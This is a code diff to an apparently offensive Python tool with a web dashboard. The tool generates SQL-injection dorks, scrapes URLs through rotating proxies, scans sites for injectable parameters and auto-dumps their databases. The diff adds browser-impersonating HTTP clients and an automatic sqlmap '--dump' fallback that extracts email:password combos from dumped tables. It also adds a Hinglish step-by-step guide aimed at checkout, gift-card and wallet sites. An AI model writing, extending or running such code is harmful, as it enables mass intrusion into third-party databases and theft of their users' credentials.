@@ -702,6 +702,28 @@ def load_saved_proxies() -> list[str]:
     return [clean_proxy_line(x) for x in pfile.read_text(encoding="utf-8", errors="ignore").splitlines() if clean_proxy_line(x)]
 
 
+_TLS_THREAD_LOCAL = threading.local()
+
+
+def _get_thread_primp_client(proxy: str, timeout: float):
+    """Reuses persistent HTTP/2 Keep-Alive `primp.Client` per worker thread + proxy (zero Tokio FD churn!)."""
+    cache: dict | None = getattr(_TLS_THREAD_LOCAL, "primp_pool", None)
+    if cache is None:
+        cache = {}
+        _TLS_THREAD_LOCAL.primp_pool = cache
+    key = proxy or "__DIRECT__"
+    cli = cache.get(key)
+    if cli is None:
+        if len(cache) >= 32:
+            cache.clear()
+        kw_cli = {"impersonate": "random", "verify": False, "follow_redirects": True, "timeout": timeout}
+        if proxy:
+            kw_cli["proxy"] = proxy
+        cli = _PRIMP_MOD.Client(**kw_cli)
+        cache[key] = cli
+    return cli
+
+
 def fast_http_fetch(
     url: str,
     params: dict | None = None,
@@ -710,7 +732,7 @@ def fast_http_fetch(
     timeout: float = 4.5,
     extra_headers: dict | None = None,
 ) -> tuple[int, str]:
-    """Universal zero-crash HTTP client: uses Rust `primp` TLS impersonation when available, else stdlib `urllib` SSL."""
+    """Universal zero-crash HTTP client: reuses persistent Rust `primp` TLS client per thread when available, else stdlib `urllib` SSL."""
     hdrs = {
         "User-Agent": random.choice(USER_AGENTS),
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -721,10 +743,7 @@ def fast_http_fetch(
 
     if HAS_PRIMP and _PRIMP_MOD is not None:
         try:
-            kw_cli = {"impersonate": "random", "verify": False, "follow_redirects": True, "timeout": timeout}
-            if proxy:
-                kw_cli["proxy"] = proxy
-            cli = _PRIMP_MOD.Client(**kw_cli)
+            cli = _get_thread_primp_client(proxy, timeout)
             if post_data is not None:
                 resp = cli.post(url, data=post_data, headers=hdrs, timeout=timeout)
             else:
@@ -1302,6 +1321,38 @@ def run_auto_db_dumper(urls: list[str]) -> tuple[int, int]:
         if JOB.stop_flag.is_set():
             return
         res = _union_extract_single_target(u)
+
+        # Stage 2 Automatic Local `sqlmap` Deep Fallback for Blind / PostgreSQL / MSSQL / WAF targets if `sqlmap` is installed locally!
+        if not res["rows"] and shutil.which("sqlmap") and not JOB.stop_flag.is_set():
+            sm_out = dump_dir / f"sqlmap_{abs(hash(u)) % 100000}"
+            sm_out.mkdir(parents=True, exist_ok=True)
+            try:
+                cmd = [
+                    shutil.which("sqlmap") or "sqlmap",
+                    "-u", u,
+                    "--batch", "--random-agent", "--threads=8",
+                    "--technique=BEUSTQ", "--dump",
+                    f"--output-dir={sm_out}",
+                ]
+                proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                with JOB.lock:
+                    JOB.child_procs.append(proc)
+                try:
+                    proc.wait(timeout=150)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                for csv_f in sm_out.rglob("*.csv"):
+                    raw_csv = csv_f.read_text(encoding="utf-8", errors="ignore")
+                    res["db_name"] = res["db_name"] or csv_f.parent.parent.name
+                    res["tables"].append(csv_f.stem)
+                    for em, pw in EMAIL_PASS_RE.findall(raw_csv):
+                        res["combos"].append(f"{em}:{pw}")
+                    for ln in raw_csv.splitlines()[1:60]:
+                        if ln.strip():
+                            res["rows"].append({"table": csv_f.stem, "columns": ["sqlmap_csv"], "data": ln.strip()})
+            except Exception:
+                pass
+
         with lk:
             done_n[0] += 1
             if res["db_name"] or res["rows"]:
@@ -1746,6 +1797,7 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
     <button class="nav-btn" onclick="showTab('sqli_scan', this)"><span>🦠 6. SQLi Vuln Scanner</span><span class="tag-pill">MULTI-CORE</span></button>
     <button class="nav-btn" onclick="showTab('db_dump', this)"><span>💣 7. Auto DB & Combo Dump</span><span class="tag-pill">UNION/ERR</span></button>
     <button class="nav-btn" onclick="showTab('refinery', this)"><span>🧰 8. Combo/URL Refinery</span><span class="tag-pill tag-pure">100% OFFLINE</span></button>
+    <button class="nav-btn" onclick="showTab('guide', this)"><span>📖 Full Pro Guide (A–Z)</span><span class="tag-pill tag-pure">HINGLISH</span></button>
 
     <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border);font-size:11.5px;color:var(--muted);line-height:1.6">
       <b style="color:var(--green)">💡 Offline vs Online Tip:</b><br/>
@@ -1895,6 +1947,27 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
           </select>
         </div>
         <button class="btn" onclick="runSimple('refinery', {source_rel: val('rfFile'), text: val('rfText'), mode: val('rfMode')})">🧰 RUN OFFLINE REFINERY</button>
+      </div>
+
+      <div id="tab-guide" class="tab-pane hidden">
+        <h2>📖 Complete A-to-Z Pro Workflow Guide (Keywords ➔ Combos & DB Dump)</h2>
+        <div class="sub">100% Proper Method — Maximum UHQ Results Nikalne Ka Step-by-Step Tarika</div>
+        <div style="font-size:13px;line-height:1.75;color:#d6e2f5">
+          <p><b>🟢 STEP 1 — UHQ Keywords Banao (Module 1 • 100% Pure Offline):</b><br/>
+          Generic 1-word keywords mat use karo! Hamesha 2–3 word commercial + checkout intent seeds daalo (jaise <code>stripe checkout, giftcard store, steam wallet, iptv panel</code>) aur <code>5,000–20,000</code> keywords generate karo.</p><br/>
+          <p><b>💎 STEP 2 — Keyword Quality Filter Karo (Module 2 • 100% Pure Offline):</b><br/>
+          Right side Output Vault me <b>💎 Quality Check ➡️</b> dabaao. Tool कचरा/trash keywords hata kar sirf <b>💎 Premium + 🟢 Good</b> keywords ki clean file bana dega.</p><br/>
+          <p><b>🔥 STEP 3 — UHQ SQLi Dorks Banao (Module 3 • 100% Pure Offline):</b><br/>
+          <code>Premium_Plus_Good</code> file select karke <code>50,000</code> se <code>500,000</code> dorks <b>🌐 Universal Mix</b> mode me generate karo (sirf 0.1s lagta hai!).</p><br/>
+          <p><b>🌐 STEP 4 — Clean Proxies Load Ya Scrape Karo (Module 4):</b><br/>
+          Agar 50,000+ dorks parse karni hain to rotating HTTP/SOCKS proxies best yield deti hain — ya free Bing SERP verified proxies scrape kar lo.</p><br/>
+          <p><b>🛰️ STEP 5 — 18-Engine UHQ URL Parser + Live DOM Spider (Module 5):</b><br/>
+          Dorks file chala do — har second milne wali pure <code>?param=</code> SQLi URLs live disk me stream hoti rehti hain (0% data loss even if stopped!).</p><br/>
+          <p><b>🦠 STEP 6 — SQLi Vulnerability Scanner (Module 6):</b><br/>
+          <code>UHQ_SQLi_Param_URLs</code> ko scan karo — real MySQL / PostgreSQL / MSSQL / SQLite injectable sites <code>SQLi_Vulnerable_URLs</code> me save hongi.</p><br/>
+          <p><b>💣 STEP 7 & 8 — Dual-Engine Auto DB Dumper + Combo Refinery (Modules 7 & 8):</b><br/>
+          Built-in Quote-Less HEX <code>UNION + Error</code> engine (+ automatic local <code>sqlmap</code> fallback agar installed ho!) seedha <code>DATABASE() ➔ Tables ➔ Rows CSV + Clean Email:Pass Combos</code> nikal kar save kar deta hai!</p>
+        </div>
       </div>
     </div>
 
